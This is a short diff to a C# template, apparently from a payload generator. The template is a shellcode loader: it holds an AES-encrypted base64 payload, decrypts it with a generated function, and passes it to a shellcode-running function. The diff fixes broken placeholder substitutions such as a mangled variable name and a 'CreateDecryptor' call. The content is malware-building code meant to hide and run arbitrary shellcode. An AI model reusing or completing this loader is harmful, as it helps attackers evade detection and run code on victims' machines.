@@ -4,7 +4,7 @@ using System.Text;
 using System.Runtime.InteropServices;
 using System.IO;
 
-namespace $NAMESPACE$
+namespace $Namespace$
 {
     public static class Program
 {
@@ -15,7 +15,7 @@ namespace $NAMESPACE$
     public static void Main()
     {
         string $EncryptedBase64Var$ = "$EncryptedBase64$";
-        byte[] $$DecryptFunc$edShellcode$ = $DecryptFunc$("$Key$", $EncryptedBase64Var$);
+        byte[] $DecryptedShellcode$ = $DecryptFunc$("$Key$", $EncryptedBase64Var$);
             $RunShellcodeFunc$($DecryptedShellcode$);
     }
 
@@ -45,7 +45,7 @@ namespace $NAMESPACE$
     Aes a = new AesManaged();
     a.Mode = CipherMode.CBC;
     a.Padding = PaddingMode.PKCS7;
-    ICryptoTransform dc = a.Create$DecryptFunc$or(tK, sa(tK, 16));
+    ICryptoTransform dc = a.CreateDecryptor(tK, sa(tK, 16));
 
     using (MemoryStream ms = new MemoryStream())
     {
